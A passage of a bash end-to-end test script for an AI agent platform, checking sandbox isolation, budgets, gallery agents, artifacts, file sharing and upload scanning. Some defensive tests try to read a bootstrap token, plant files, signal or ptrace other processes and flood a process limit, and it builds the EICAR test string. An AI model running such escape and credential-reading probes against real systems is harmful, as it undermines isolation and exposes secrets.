echo "plant=$($R 2015 sh -c "echo {} > $dir/agent/settings.json" 2>&1 | grep -c 'Permission denied')"
echo "read_model=$($R 2015 cat "$dir/model.json" 2>&1 | grep -c 'Permission denied')"
echo "read_token=$($R 2015 cat /run/kobe-agent/bootstrap/bootstrap-token 2>&1 | grep -c 'Permission denied')"
echo "signal=$($R 2015 sh -c "kill -0 $agent; kill -0 $pi" 2>&1 | grep -c 'not permitted')"
# As a tool of that Pi (its own uid): no ptrace/memory of an ancestor, no inspector through
# SIGUSR1, no way back into Pi's stdin/stdout (sockets: /proc/<pi>/fd/N cannot be reopened).
u=$(stat -c %u /proc/$pi)
$R $u --probe-ptrace >/dev/null 2>&1; echo "probe=$?"
$R $u sh -c "kill -USR1 $pi"; sleep 1
echo "inspector=$(node -e 'require("net").connect(9229,"127.0.0.1").on("connect",()=>{console.log("open");process.exit(0)}).on("error",()=>console.log("closed"))')"
echo "stdio=$($R $u sh -c "for n in 0 1; do ( : > /proc/$pi/fd/\$n ); done" 2>&1 | grep -cE 'No such device or address|Permission denied')"
echo "pi_alive=$(kill -0 $pi 2>/dev/null; [ -d /proc/$pi ] && echo yes || echo no)"
# RLIMIT_NPROC (1024 per identity) under gVisor: an identity no thread uses tries 1500 processes;
# it must stop at the limit, and --kill-all (no fork needed) must still clear it.
$R 2014 sh -c 'i=0; while [ $i -lt 1500 ]; do sleep 120 & i=$((i+1)); done' >/dev/null 2>&1
echo "nproc=$(ps -eo uid= | awk '$1 == 2014' | wc -l)"
$R 2014 --kill-all; echo "nproc_kill=$?"
sleep 1; echo "nproc_left=$(ps -eo uid=,stat= | awk '$1 == 2014 && $2 !~ /^Z/' | wc -l)"
SH
    # The Owner's sandbox pod: the one whose claim-uid label is the Owner's claim (u-<user id>).
    owner_claim=$($KUBECTL -n "$TEAM_NS" get sandboxclaim "u-$owner_id" -o jsonpath='{.metadata.uid}' 2>/dev/null || true)
    owner_pod=$($KUBECTL -n "$TEAM_NS" get pods -l "agents.x-k8s.io/claim-uid=${owner_claim:-none}" -o name 2>/dev/null | head -1)
    privsep=$($KUBECTL -n "$TEAM_NS" exec "${owner_pod:-pod/none}" -c agent -- sh -c "$PRIVSEP_SH" 2>&1 || true)
    printf '     %s\n' "$privsep"
    contains "the agent runs as uid 1000 with no capabilities" '^agent=1000 caps=0+$' "$privsep"
    contains "Pi runs under a Pi identity, its runtime dir the agent's with Pi's group" \
      '^pi_uid=20[0-9][0-9] dir=kobe:kobe-pi-[0-9]+ 2750$' "$privsep"
    contains "another identity cannot plant a file in that Pi's runtime dir (EACCES)" '^plant=1$' "$privsep"
    contains "another identity cannot read that Pi's model file (token, run id)" '^read_model=1$' "$privsep"
    contains "Pi identities cannot read the agent's bootstrap token" '^read_token=1$' "$privsep"
    contains "Pi identities cannot signal the agent or another thread's Pi" '^signal=2$' "$privsep"
    contains "a tool cannot ptrace or read the memory of its Pi (behavioural probe under gVisor)" '^probe=0$' "$privsep"
    contains "SIGUSR1 from a tool opens no inspector in Pi (node --disable-sigusr1)" '^inspector=closed$' "$privsep"
    contains "a tool cannot reopen its Pi's stdin/stdout through /proc (gVisor: EACCES; Linux: ENXIO)" '^stdio=2$' "$privsep"
    contains "Pi survives the SIGUSR1" '^pi_alive=yes$' "$privsep"
    contains "gVisor enforces an identity's process limit (1500 tried, at most 1024 run)" '^nproc=(10[0-2][0-9]|9[5-9][0-9])$' "$privsep"
    contains "--kill-all clears an identity at its process limit" '^nproc_kill=0$' "$privsep"
    contains "nothing of it is left" '^nproc_left=0$' "$privsep"
    # KOBE-168: with the tool executor on, the isolation and workspace checks of the paired uid.
    if [[ "${KOBE_E2E_TOOL_EXECUTOR:-}" == 1 ]]; then source e2e/executor/isolation.sh; fi

    # KOBE-44: a model chosen for the thread is the run's model (here the vLLM-style custom
    # provider, `qwen`, not the team default); once the team disables it, the run fails clearly.
    # (KOBE-40's checks above left qwen disabled: enable it for the team first.)
    expect "the team enables qwen" '^200 ' "$(as_owner "PUT /v1/team/models/qwen {\"enabled\":true}")"
    chosen_out=$(chat_run "hello-qwen-$RANDOM" 300000 qwen)
    # The user decided this check is non-blocking: right after the enable a run may fail
    # model_not_enabled for a while (possibly provider-side); retry for about 60 s, then warn.
    chosen_end=$((SECONDS + 60))
    while grep -q '^code=model_not_enabled$' <<<"$chosen_out" && ((SECONDS < chosen_end)); do
      sleep 5
      chosen_out=$(chat_run "hello-qwen-$RANDOM" 300000 qwen)
    done
    printf '     chat (thread model): %s\n' "$(printf '%s' "$chosen_out" | grep -v '^text=' | tr '\n' ' ')"
    contains "a thread created with a chosen model stores it (KOBE-44)" '^thread=201:qwen$' "$chosen_out"
    contains "the run started on the thread's model, not the team default" '^started_model=qwen$' "$chosen_out"
    if grep -q '^code=model_not_enabled$' <<<"$chosen_out"; then
      echo "WARN model enable slow, provider-side (the thread's model answered model_not_enabled for 60 s)"
    else
      contains "and was answered through that model's provider" '^terminal=run.completed$' "$chosen_out"
    fi
    expect "the team disables the thread's model" '^200 ' "$(as_owner "PUT /v1/team/models/qwen {\"enabled\":false}")"
    gone_out=$(chat_run "gone-$RANDOM" 120000 qwen)
    contains "a thread can't choose a model the team disabled (409)" '^thread=409:default$' "$gone_out"
    as_owner "PUT /v1/team/models/qwen {\"enabled\":true}" >/dev/null

    # A clear failure when the team has no model: the run fails with the server's message, nothing hangs.
    expect "the team disables its models" '^200 ' "$(as_owner "PUT /v1/team/models/fast {\"enabled\":false}")"
    no_model=$(chat_run "no-model-$RANDOM" 180000)
    printf '     chat (no model): %s\n' "$(printf '%s' "$no_model" | grep -v '^text=' | tr '\n' ' ')"
    contains "without a team model the run fails model_not_configured" '^terminal=run.failed$' "$no_model"
    contains "with the server's own message" '^code=model_not_configured$' "$no_model"
    contains "that tells the user what to do" '^error_message=No model is enabled for your team yet' "$no_model"
    as_owner "PUT /v1/team/models/fast {\"enabled\":true,\"is_default\":true}" >/dev/null

    # KOBE-42 / Gate 2: a budget stops a run after its current step. The fake model answers the
    # first call with a bash tool call; that call alone ($0.08 at these prices) uses up the team's
    # $0.01 budget, so the run's next model call never starts and the run ends budget_stopped.
    budget_setup=$(as_owner \
      "PATCH /v1/install/models/catalog/fast {\"input_usd_per_mtok\":10000,\"output_usd_per_mtok\":10000}" \
      "PUT /v1/team/budgets/team {\"monthly_usd\":0.01}")
    expect "the catalog model is priced and the team budget set" '^200 ' "$budget_setup"
    budget_out=$(chat_run "kobe-tool-step budget-$RANDOM" 300000)
    printf '     chat (budget): %s\n' "$(printf '%s' "$budget_out" | grep -v '^text=' | tr '\n' ' ')"
    budget_run=$(printf '%s\n' "$budget_out" | sed -n 's/^run=//p')
    budget_run_sql="'${budget_run:-00000000-0000-4000-8000-000000000000}'"
    contains "Gate 2: the run ends budget_stopped" '^terminal=run.budget_stopped$' "$budget_out"
    contains "Gate 2: with the budget's message" 'used up' \
      "$(psql_kobe "SELECT payload->>'message' FROM run_events WHERE run_id = $budget_run_sql AND type = 'run.budget_stopped'")"
    contains "Gate 2: the step in flight finished (its model call is in the ledger)" '^1$' \
      "$(psql_kobe "SELECT count(*) FROM run_usage WHERE run_id = $budget_run_sql AND status = 200")"
    # Deterministic: the fake model's tool step runs 3 s, and the stop reaches Pi meanwhile.
    contains "Gate 2: the stop reached the run during its step (after_step)" '^after_step$' \
      "$(psql_kobe "SELECT CASE WHEN EXISTS (SELECT 1 FROM audit_log WHERE action = 'run.budget_stopped' AND target->>'runId' = '${budget_run:-none}') THEN 'after_step' END")"
    contains "Gate 2: no new model call started after the budget was used up" '^1$' \
      "$(psql_kobe "SELECT count(*) FROM run_usage WHERE run_id = $budget_run_sql")"
    contains "Gate 2: the budget reached is audited once" '^1$' \
      "$(psql_kobe "SELECT count(*) FROM audit_log WHERE team_id = '$E2E_TEAM_ID' AND action = 'models.budget.reached'")"
    contains "Gate 2: new runs are refused while the budget is used up" '^message=429$' \
      "$(chat_run "refused-$RANDOM" 60000)"
    restore=$(as_owner \
      "PUT /v1/team/budgets/team {\"monthly_usd\":null}" \
      "PATCH /v1/install/models/catalog/fast {\"input_usd_per_mtok\":null,\"output_usd_per_mtok\":null}")
    expect "the budget and prices are removed again" '^200 ' "$restore"

    # KOBE-89: the five gallery agents each complete a short sample task in the Owner's real sandbox
    # (gVisor, the image's baked built-in skills, no network), through the fake model: it answers
    # "bash: <command>" with a bash tool call. No
    # model is pinned by any gallery agent, so the runs use the team default. The server seeded the
    # agents at start. Sandbox tools run without approval unless a rule asks (KOBE-37 left one).
    echo "==> gallery agents (KOBE-89)"
    psql_kobe "DELETE FROM tool_rules WHERE team_id = '$E2E_TEAM_ID' AND scope = 'team';" >/dev/null
    gallery_id() { psql_kobe "SELECT id FROM install_agents WHERE scope = 'gallery' AND gallery_key = '$1' AND archived_at IS NULL"; }
    gallery_run() { # key content [timeout-ms] → CHAT_JS output for a thread with that gallery agent
      local id
      id=$(gallery_id "$1")
      if [[ -z "$id" ]]; then echo "gallery_agent=missing:$1"; return; fi
      chat_run "$2" "${3:-300000}" "" "$id"
    }
    gal_dir='cd "${TMPDIR:-/tmp}" && rm -rf g89 && mkdir g89 && cd g89 && SK=/opt/kobe/skills'
    for gkey in assistant data-analyst researcher document-drafter code-helper; do
      contains "gallery agent $gkey is seeded and not archived" '^[0-9a-f-]{36}$' "$(gallery_id "$gkey")"
    done
    g_out=$(gallery_run assistant "hello-assistant-$RANDOM")
    printf '     gallery assistant: %s\n' "$(printf '%s' "$g_out" | grep -v '^text=' | tr '\n' ' ')"
    contains "Assistant: a thread with it starts (201, team default model)" '^thread=201:default$' "$g_out"
    contains "Assistant: the run completed with the expected text" '^text=fake-openai: hello-assistant-[0-9]+$' "$g_out"
    contains "Assistant: the thread is pinned to the gallery agent" '^gallery$' \
      "$(psql_kobe "SELECT agent_scope FROM threads WHERE id = '$(printf '%s\n' "$g_out" | sed -n 's/^thread_id=//p')'")"
    g_out=$(gallery_run data-analyst "bash: $gal_dir && python \$SK/data-analysis/scripts/describe.py \$SK/data-analysis/scripts/sample.csv | grep -c 'rows: 6' && python \$SK/charts/scripts/chart.py \$SK/charts/scripts/sample.csv --kind bar --x region --y amount --agg sum --title t --out c.png >/dev/null && echo chart-bytes \$(wc -c < c.png)")
    printf '     gallery data analyst: %s\n' "$(printf '%s' "$g_out" | tr '\n' ' ' | cut -c1-400)"
    contains "Data Analyst: the run completed" '^terminal=run.completed$' "$g_out"
    contains "Data Analyst: the data-analysis skill profiled the data and the charts skill produced a PNG" \
      '^text=fake-openai: tool said: 1 chart-bytes [0-9]{4,}$' "$g_out"
    # KOBE-123: the agent's prompt reaches Pi (--append-system-prompt) and so the model: the fake
    # model answers "system?" with the system messages it received.
    g_out=$(gallery_run researcher "system?")
    contains "Researcher: the run completes with no web search configured" '^terminal=run.completed$' "$g_out"
    contains "Researcher: the web-search-unavailable notice reaches the model through Pi's system prompt" \
      '^text=fake-openai: system said: .*Web search is not available here, so I can only work from the material you give me\.' "$g_out"
    g_out=$(gallery_run assistant "system?")
    contains "Assistant: its own prompt (not the Researcher's) reaches the model" \
      '^text=fake-openai: system said: ' "$g_out"
    contains "Assistant: the Researcher's notice is absent from its system prompt" '^0$' \
      "$(printf '%s\n' "$g_out" | grep -c 'Web search is not available here' || true)"
    contains "Researcher: its published prompt has it say plainly that web search is unavailable" \
      'Web search is not available here, so I can only work from the material you give me\.' \
      "$(psql_kobe "SELECT v.prompt FROM install_agent_versions v JOIN install_agents a ON a.id = v.agent_id AND v.version = a.current_version WHERE a.gallery_key = 'researcher'")"
    g_out=$(gallery_run researcher "bash: $gal_dir && python \$SK/docx/scripts/md_to_docx.py \$SK/docx/scripts/sample.md in.docx --title T >/dev/null && python \$SK/docx/scripts/docx_text.py in.docx | grep -c 'south | 310.35'")
    contains "Researcher: it reads provided material with its skills offline (docx text extracted)" \
      '^text=fake-openai: tool said: 1$' "$g_out"
    g_out=$(gallery_run document-drafter "bash: $gal_dir && python \$SK/docx/scripts/md_to_docx.py \$SK/docx/scripts/sample.md out.docx --title T >/dev/null && python \$SK/docx/scripts/docx_text.py out.docx | grep -c 'south | 310.35' && python \$SK/pdf/scripts/md_to_pdf.py \$SK/pdf/scripts/sample.md out.pdf --title T >/dev/null && test -s out.pdf && echo docx-and-pdf-produced")
    printf '     gallery document drafter: %s\n' "$(printf '%s' "$g_out" | tr '\n' ' ' | cut -c1-400)"
    contains "Document Drafter: the docx and pdf skills produced the files" \
      '^text=fake-openai: tool said: 1 docx-and-pdf-produced$' "$g_out"
    g_out=$(gallery_run code-helper "bash: $gal_dir && python \$SK/code-review/scripts/scan.py \$SK/code-review/scripts/sample.py | grep -o '[0-9]* finding' | head -1")
    printf '     gallery code helper: %s\n' "$(printf '%s' "$g_out" | tr '\n' ' ' | cut -c1-400)"
    contains "Code Helper: the code-review skill scanned the sample" '^text=fake-openai: tool said: 4 finding$' "$g_out"

    # KOBE-131 (KOBE-55): a run's fake model calls create_artifact with an HTML page holding an inline
    # script ("tool: <name> <json>"); the artifact is stored, listed, readable and framed under the
    # D-6 headers; update_artifact in the same thread makes version 2.
    echo "==> artifacts (KOBE-131)"
    art_html='<!doctype html><html><body><h1 id=t>Sales</h1><script>document.getElementById("t").textContent="Sales chart"</script></body></html>'
    art_new="${art_html/Sales chart/Sales chart v2}"
    art_out=$(chat_run "tool: create_artifact {\"kind\":\"html\",\"title\":\"Sales chart\",\"content\":\"${art_html//\"/\\\"}\"}" 300000 "" "$(gallery_id data-analyst)" "" 1)
    printf '     artifact create: %s\n' "$(printf '%s' "$art_out" | tr '\n' ' ' | cut -c1-500)"
    art_thread=$(printf '%s\n' "$art_out" | sed -n 's/^thread_id=//p')
    contains "artifacts: the run completed" '^terminal=run.completed$' "$art_out"
    contains "artifacts: the event stream carried artifact.created (version 1)" \
      '^artifact_events=artifact.created:[0-9a-f-]{36}:v1$' "$art_out"
    art_id=$(printf '%s\n' "$art_out" | sed -n 's/^artifact_events=artifact.created:\([0-9a-f-]*\):v1$/\1/p')
    art_list=$(as_owner "GET /v1/artifacts?thread_id=$art_thread")
    contains "artifacts: GET /v1/artifacts?thread_id= lists it" "^200 .*\"id\":\"${art_id:-none}\".*\"Sales chart\"" "$art_list"
    # as_owner prints the status and the first 400 bytes only; the header and content checks use a
    # dedicated fetch through the server pod.
    art_fetch() { # path → status, then the headers and body (JSON lines) of an owner-authenticated GET
      $KUBECTL -n "$NS" exec deploy/kobe-server -c server -- node --input-type=module -e "
        const base = 'http://127.0.0.1:8080', origin = process.env.KOBE_PUBLIC_URL;
        const h = { origin, 'content-type': 'application/json', 'x-kobe-team': '$E2E_TEAM_ID' };
        let login;
        for (let i = 0; i < 4; i++) { // sign-in is rate limited (3 per 10 s): wait out a 429
          login = await fetch(base + '/api/auth/sign-in/email', { method: 'POST', headers: h,
            body: JSON.stringify({ email: 'owner@e2e.test', password: 'e2e owner password' }) });
          if (login.status !== 429) break;
          await new Promise((r) => setTimeout(r, 11000));
        }
        const cookie = login.headers.getSetCookie().map((c) => c.split(';')[0]).join('; ');
        await fetch(base + '/v1/me/teams/active', { method: 'PUT', headers: { ...h, cookie }, body: JSON.stringify({ teamId: '$E2E_TEAM_ID' }) });
        const res = await fetch(base + process.argv[1], { headers: { ...h, cookie } });
        console.log('status=' + res.status);
        for (const [k, v] of res.headers) console.log('h:' + k + '=' + v);
        console.log('body=' + (await res.text()).replace(/\\n/g, ' '));
      " "$1" 2>&1
    }
    art_content=$(art_fetch "/v1/artifacts/$art_id/versions/1/content")
    contains "artifacts: the content endpoint returns the bytes (inline script included)" \
      'body=<!doctype html>.*<script>document.getElementById\("t"\).textContent="Sales chart"</script>' "$art_content"
    art_frame=$(art_fetch "/v1/artifacts/$art_id/versions/1/frame?team=$E2E_TEAM_ID")
    contains "artifacts: the frame is served (200)" '^status=200$' "$art_frame"
    contains "artifacts: the frame CSP sandboxes scripts without same-origin (D-6)" \
      '^h:content-security-policy=sandbox allow-scripts allow-forms;' "$art_frame"
    contains "artifacts: the frame CSP forbids network access from the page (connect-src none)" \
      "^h:content-security-policy=.*connect-src 'none'" "$art_frame"
    contains "artifacts: the frame sends X-Frame-Options SAMEORIGIN" '^h:x-frame-options=SAMEORIGIN$' "$art_frame"
    art_out=$(chat_run "tool: update_artifact {\"artifact_id\":\"$art_id\",\"content\":\"${art_new//\"/\\\"}\"}" 300000 "" "" "$art_thread" 1)
    printf '     artifact update: %s\n' "$(printf '%s' "$art_out" | tr '\n' ' ' | cut -c1-500)"
    contains "artifacts: the update run completed" '^terminal=run.completed$' "$art_out"
    contains "artifacts: the event stream carried artifact.updated (version 2)" \
      "^artifact_events=artifact.updated:$art_id:v2\$" "$art_out"
    contains "artifacts: GET /v1/artifacts/:id shows two versions" '^2$' \
      "$(art_fetch "/v1/artifacts/$art_id" | sed -n 's/^body=//p' | grep -o '"version":[0-9]*' | sort -u | wc -l | tr -d ' ')"
    contains "artifacts: version 2 holds the revised content" 'Sales chart v2' \
      "$(art_fetch "/v1/artifacts/$art_id/versions/2/content")"

    # KOBE-152 (54f of KOBE-54): the Document Drafter writes a file in the Owner's sandbox, then the
    # fake model calls share_file; file.shared carries the file, the thread's reader downloads it
    # (attachment, nosniff), another member of the team gets 404, and the file outlives its workspace
    # copy (deleted from the browser API, which is audited).
    echo "==> share_file (KOBE-152)"
    READER_ID=7e2e0000-0000-4000-8000-0000000000f1
    psql_kobe "INSERT INTO users (id, name, email, email_verified) VALUES ('$READER_ID', 'E2E reader', 'reader@e2e.test', true) ON CONFLICT DO NOTHING;
      INSERT INTO accounts (user_id, account_id, provider_id, password)
        SELECT '$READER_ID', '$READER_ID', 'credential', password FROM accounts
        WHERE provider_id = 'credential' AND user_id = '$owner_id'
          AND NOT EXISTS (SELECT 1 FROM accounts WHERE user_id = '$READER_ID');
      INSERT INTO team_members (team_id, user_id, role) VALUES ('$E2E_TEAM_ID', '$READER_ID', 'member') ON CONFLICT DO NOTHING;" >/dev/null
    file_fetch() { # email path [method] → status, then the headers and body (JSON lines) of that user's request
      $KUBECTL -n "$NS" exec deploy/kobe-server -c server -- node --input-type=module -e "
        const base = 'http://127.0.0.1:8080', origin = process.env.KOBE_PUBLIC_URL;
        const h = { origin, 'content-type': 'application/json', 'x-kobe-team': '$E2E_TEAM_ID' };
        let login;
        for (let i = 0; i < 4; i++) { // sign-in is rate limited (3 per 10 s): wait out a 429
          login = await fetch(base + '/api/auth/sign-in/email', { method: 'POST', headers: h,
            body: JSON.stringify({ email: process.argv[1], password: 'e2e owner password' }) });
          if (login.status !== 429) break;
          await new Promise((r) => setTimeout(r, 11000));
        }
        const cookie = login.headers.getSetCookie().map((c) => c.split(';')[0]).join('; ');
        await fetch(base + '/v1/me/teams/active', { method: 'PUT', headers: { ...h, cookie }, body: JSON.stringify({ teamId: '$E2E_TEAM_ID' }) });
        const res = await fetch(base + process.argv[2], { method: process.argv[3] || 'GET', headers: { ...h, cookie } });
        console.log('status=' + res.status);
        for (const [k, v] of res.headers) console.log('h:' + k + '=' + v);
        console.log('body=' + (await res.text()).replace(/\\n/g, ' '));
      " "$1" "$2" "${3:-}" 2>&1
    }
    share_text="kobe-152 $(date +%s) $RANDOM"
    sf_out=$(chat_run "bash: echo '$share_text' > /workspace/shared-report.txt; exit 0" 300000 "" "$(gallery_id document-drafter)" "" 1)
    sf_thread=$(printf '%s\n' "$sf_out" | sed -n 's/^thread_id=//p')
    contains "share_file: the run that wrote the file completed" '^terminal=run.completed$' "$sf_out"
    sf_out=$(chat_run "tool: share_file {\"path\":\"shared-report.txt\",\"description\":\"E2E report\"}" 300000 "" "" "$sf_thread" 1)
    printf '     share_file: %s\n' "$(printf '%s' "$sf_out" | tr '\n' ' ' | cut -c1-500)"
    contains "share_file: the run completed" '^terminal=run.completed$' "$sf_out"
    contains "share_file: the event stream carried file.shared (id, name, size)" \
      "^file_events=[0-9a-f-]{36}:shared-report.txt:$((${#share_text} + 1))\$" "$sf_out"
    sf_id=$(printf '%s\n' "$sf_out" | sed -n 's/^file_events=\([0-9a-f-]*\):.*/\1/p')
    contains "share_file: the file has a row (kind shared, in the thread)" "^shared\\|$sf_thread\$" \
      "$(psql_kobe "SELECT kind || '|' || thread_id FROM files WHERE team_id = '$E2E_TEAM_ID' AND id = '${sf_id:-00000000-0000-4000-8000-000000000000}'")"
    sf_dl=$(file_fetch owner@e2e.test "/v1/files/$sf_id/content")
    contains "share_file: the thread's reader downloads the bytes (200)" '^status=200$' "$sf_dl"
    contains "share_file: the body is the file written in the sandbox" "^body=$share_text( |\$)" "$sf_dl"
    contains "share_file: the download is an attachment" '^h:content-disposition=attachment' "$sf_dl"
    contains "share_file: the download is never sniffed" '^h:x-content-type-options=nosniff$' "$sf_dl"
    sf_other=$(file_fetch reader@e2e.test "/v1/files/$sf_id/content")
    contains "share_file: another member of the team cannot read the thread's file (404)" '^status=404$' "$sf_other"
    if printf '%s' "$sf_other" | grep -q "$share_text"; then fail "share_file: the other user saw no bytes"; else ok "share_file: the other user saw no bytes"; fi
    contains "share_file: the browser API deletes the workspace copy (2xx)" '^status=20[0-9]$' \
      "$(file_fetch owner@e2e.test '/v1/workspace/files?path=shared-report.txt' DELETE)"
    contains "share_file: deleting from the browser is audited" '^1$' \
      "$(psql_kobe "SELECT count(*) FROM audit_log WHERE team_id = '$E2E_TEAM_ID' AND action = 'workspace.file_deleted'" | awk '$1 >= 1 {print 1; exit} {print 0}')"
    contains "share_file: the shared file survives losing its workspace copy (still 200)" '^status=200$' \
      "$(file_fetch owner@e2e.test "/v1/files/$sf_id/content")"

    # KOBE-146 (53f of KOBE-53): uploads end to end. The Owner uploads a file into a new thread
    # through the API, a limit error is refused, the file is attached to a message, and the
    # Owner's real sandbox reads it under /workspace/uploads/<thread>/ (the fake model answers
    # "bash: <command>" with a bash tool call; `exit 0` ends the command before the attachment
    # note the agent appends to the prompt). Then the thread is deleted forever: its object leaves
    # S3. ClamAV is off in this install (its image and signature download cost minutes and
    # ~1 GiB of memory per cluster): uploads report scan "skipped". The scan itself (EICAR
    # rejected, clamd down = 503) runs when KOBE_E2E_CLAMAV=1 (the nightly and manual runs).
    echo "==> uploads (KOBE-146)"
    read -r -d '' UPLOAD_JS <<'JS' || true
const [team, mode, threadArg, content] = process.argv.slice(1);
const base = "http://127.0.0.1:" + process.env.PORT;
const origin = new URL(process.env.KOBE_PUBLIC_URL).origin;
const jar = new Map();
const call = async (method, path, body, extra = {}) => {
  const res = await fetch(base + path, {
    method,
    headers: { origin, "x-kobe-team": team, ...extra, cookie: [...jar].map(([k, v]) => k + "=" + v).join("; ") },
    body,
  });
  for (const c of res.headers.getSetCookie()) { const [pair] = c.split(";"); const at = pair.indexOf("="); jar.set(pair.slice(0, at), pair.slice(at + 1)); }
  const text = await res.text();
  let json = {}; try { json = JSON.parse(text); } catch {}
  return { status: res.status, json, text };
};
const jsonCall = (m, p, b) => call(m, p, b === undefined ? undefined : JSON.stringify(b), { "content-type": "application/json" });
const upload = (name, bytes, threadId) => {
  const form = new FormData();
  if (threadId) form.append("thread_id", threadId);
  form.append("file", new File([bytes], name, { type: "text/plain" }));
  return call("POST", "/v1/uploads", form);
};
const out = (k, v) => console.log(k + "=" + v);
let login;
for (let i = 0; i < 4; i++) {
  login = await jsonCall("POST", "/api/auth/sign-in/email", { email: "owner@e2e.test", password: "e2e owner password" });
  if (login.status !== 429) break;
  await new Promise((r) => setTimeout(r, 11000));
}
out("signin", login.status);
await jsonCall("PUT", "/v1/me/teams/active", { teamId: team });
if (mode === "scan") {
  // Built at run time so this file holds no antivirus signature as a literal.
  const eicar = ["X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR", "-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"].join("");
  const bad = await upload("eicar.txt", eicar, threadArg);
  out("eicar", bad.status + ":" + (bad.json.code ?? "-"));
  const good = await upload("clean.txt", "clean " + Date.now(), threadArg);
  out("clean", good.status + ":" + (good.json.scan ?? good.json.code ?? "-"));
  const again = await upload("clean2.txt", "clean2 " + Date.now(), threadArg);
  out("again", again.status + ":" + (again.json.scan ?? again.json.code ?? "-"));
} else {
  const thread = await jsonCall("POST", "/v1/threads", { title: "kobe-146" });
  const threadId = thread.json.thread_id;
  out("thread_id", threadId ?? "-");
  const ok = await upload("e2e-upload.txt", content ?? "", threadId);
  out("upload", ok.status + ":" + (ok.json.scan ?? "-") + ":" + (ok.json.size_bytes ?? "-") + ":" + (ok.json.name ?? "-"));
  out("file_id", ok.json.file_id ?? "-");
  const big = await upload("big.bin", new Uint8Array(2 * 1024 * 1024).fill(97), threadId);
  out("limit", big.status + ":" + (big.json.code ?? "-") + ":" + (big.json.limit_bytes ?? "-"));
}
JS
    upload_js() { # mode [thread-id] → the UPLOAD_JS output
      $KUBECTL -n "$NS" exec deploy/kobe-server -c server -- \
        node --input-type=module -e "$UPLOAD_JS" "$E2E_TEAM_ID" "$1" "${2:-}" "${UPLOAD_CONTENT:-}" 2>&1 | tail -8
    }
    UPLOAD_CONTENT="kobe-146 $(date +%s) $RANDOM"
    up_out=$(upload_js plain)
    printf '     upload: %s\n' "$(printf '%s' "$up_out" | tr '\n' ' ')"
    up_thread=$(printf '%s\n' "$up_out" | sed -n 's/^thread_id=//p')
    up_file=$(printf '%s\n' "$up_out" | sed -n 's/^file_id=//p')
    contains "uploads: the Owner uploads a file into a thread (201, not scanned, its size and name)" \
      "^upload=201:skipped:${#UPLOAD_CONTENT}:e2e-upload.txt\$" "$up_out"
    contains "uploads: a file over the limit is refused (413 file_too_large, the limit named)" \
      '^limit=413:file_too_large:1048576$' "$up_out"
    contains "uploads: the stored file has a row (kind upload, scan_status none)" '^upload\|none$' \
      "$(psql_kobe "SELECT kind || '|' || scan_status FROM files WHERE team_id = '$E2E_TEAM_ID' AND id = '${up_file:-00000000-0000-4000-8000-000000000000}'")"
    contains "uploads: only the one accepted file is stored (the refused one left nothing)" '^1$' \
      "$(psql_kobe "SELECT count(*) FROM files WHERE team_id = '$E2E_TEAM_ID' AND thread_id = '${up_thread:-00000000-0000-4000-8000-000000000000}'")"
    s3_ls() { # thread-id → the object listing of the thread's uploads in S3
      $KUBECTL -n kobe-deps exec deploy/s3 -- sh -c "echo 'fs.ls /buckets/kobe/teams/$E2E_TEAM_ID/threads/$1/uploads/' | weed shell -master=localhost:9333" 2>&1 || true
    }
    contains "uploads: the object is in S3 inside the thread's tree" "${up_file:-none}" "$(s3_ls "${up_thread:-none}")"
    msg_out=$(chat_run "bash: cat /workspace/uploads/$up_thread/e2e-upload.txt; exit 0" 300000 "" "" "$up_thread" 1 "$up_file")
    printf '     upload message: %s\n' "$(printf '%s' "$msg_out" | tr '\n' ' ' | cut -c1-500)"
    contains "uploads: a message with the file starts a run (201)" '^message=201$' "$msg_out"
    contains "uploads: the run completed" '^terminal=run.completed$' "$msg_out"
    contains "uploads: the sandbox read the file under /workspace/uploads/<thread>/" \
      "^text=fake-openai: tool said: ${UPLOAD_CONTENT}( |\$)" "$msg_out"
    contains "uploads: the file is attached to the run (files.run_id set)" '^t$' \
      "$(psql_kobe "SELECT run_id IS NOT NULL FROM files WHERE team_id = '$E2E_TEAM_ID' AND id = '${up_file:-00000000-0000-4000-8000-000000000000}'")"
    contains "uploads: attaching the file keeps its object until the thread goes" "${up_file:-none}" \
      "$(s3_ls "${up_thread:-none}")"
    up_purged() { ! s3_ls "$up_thread" | grep -q "${up_file:-none}"; }
    as_owner "DELETE /v1/threads/$up_thread" >/dev/null
    contains "uploads: Delete forever of the thread answers 204" '^204 ' "$(as_owner "POST /v1/threads/$up_thread/purge")"
    if until_ok 60 up_purged; then ok "uploads: the thread purge removed the object from S3"
    else fail "uploads: the thread purge removed the object from S3"; fi
    contains "uploads: the file row is gone with the thread" '^0$' \
      "$(psql_kobe "SELECT count(*) FROM files WHERE team_id = '$E2E_TEAM_ID' AND id = '${up_file:-00000000-0000-4000-8000-000000000000}'")"

    if [[ "${KOBE_E2E_CLAMAV:-}" == 1 ]]; then
      # ClamAV on (the real clamav/clamav image; it downloads its signature database first, so the
      # rollout is given 10 min). EICAR is rejected and leaves no object or row, a clean file passes
      # with scan "clean", and with clamd gone uploads fail closed (503 scan_unavailable).
      echo "==> uploads with ClamAV (KOBE-146)"
      if out=$($HELM upgrade kobe charts/kobe -n "$NS" --reuse-values --wait --timeout 10m --set clamav.enabled=true 2>&1); then
        ok "uploads: chart upgraded with clamav.enabled=true"
      else fail "uploads: chart upgraded with clamav.enabled=true: $out"; fi
      av_pod_user() { $KUBECTL -n "$NS" get pod -l app.kubernetes.io/component=clamav -o jsonpath='{.items[0].spec.securityContext.runAsUser}' 2>/dev/null; }
      contains "uploads: clamd runs as a non-root user (uid 100)" '^100$' "$(av_pod_user)"
      contains "uploads: the clamd container really runs as uid 100, not root" '^100$' \
        "$($KUBECTL -n "$NS" exec deploy/kobe-clamav -- id -u 2>&1 | tr -d ' ')"
      scan_thread=$(as_owner "POST /v1/threads {\"title\":\"kobe-146-scan\"}" | sed -n 's/.*"thread_id":"\([0-9a-f-]*\)".*/\1/p')
      scan_out=$(upload_js scan "$scan_thread")
      printf '     scan: %s\n' "$(printf '%s' "$scan_out" | tr '\n' ' ')"
      contains "uploads: an EICAR upload is rejected (422 scan_rejected)" '^eicar=422:scan_rejected$' "$scan_out"
      contains "uploads: a clean upload passes the scan (201, scan clean)" '^clean=201:clean$' "$scan_out"
      contains "uploads: the rejection is audited" '^1$' \
        "$(psql_kobe "SELECT count(*) FROM audit_log WHERE team_id = '$E2E_TEAM_ID' AND action = 'workspace.upload_scan_refused' AND target->>'reason' = 'scan_rejected'")"
      contains "uploads: the rejected file left no row (only the clean files)" '^2$' \
